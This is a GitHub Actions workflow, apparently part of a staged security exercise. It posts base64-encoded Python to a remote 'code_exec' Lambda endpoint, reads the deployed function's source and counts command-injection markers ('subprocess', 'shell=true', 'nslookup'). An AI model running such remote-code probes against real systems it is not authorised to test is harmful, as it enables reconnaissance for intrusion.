name: Stage2-02-Inspect-Deployed-Files

on:
  push:
    branches:
      - corgi

permissions:
  contents: read

jobs:
  inspect:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec

    steps:
      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Inspect deployed files
        run: |
          python3 - <<'PY'
          import os
          import base64
          import requests
          from requests_aws4auth import AWS4Auth

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          tests = {
              "var_task_exists": r'''
          import os
          raise SystemExit(7 if os.path.isdir("/var/task") else 9)
          ''',

              "lambda_file_exists": r'''
          import os
          raise SystemExit(7 if os.path.isfile("/var/task/lambda_function.py") else 9)
          ''',

              "lambda_source_markers": r'''
          import os

          try:
              path = "/var/task/lambda_function.py"

              if not os.path.isfile(path):
                  raise SystemExit(9)

              with open(path, "rb") as handle:
                  data = handle.read(65536).lower()

              markers = [
                  b"subprocess",
                  b"shell=true",
                  b"nslookup",
                  b"lambda_handler",
                  b"domain = event.get"
              ]

              matches = sum(marker in data for marker in markers)
              raise SystemExit(20 + matches)

          except SystemExit:
              raise

          except Exception:
              raise SystemExit(19)
          ''',

              "opt_directory": r'''
          import os
          raise SystemExit(7 if os.path.isdir("/opt") else 9)
          '''
          }

          for name, code in tests.items():
              encoded = base64.b64encode(code.encode()).decode()

              response = requests.post(
                  os.environ["API_URL"],
                  json={"code": encoded},
                  auth=auth,
                  timeout=40
              )

              print(f"TEST={name}")
              print(response.text)
              print("---")
          PY
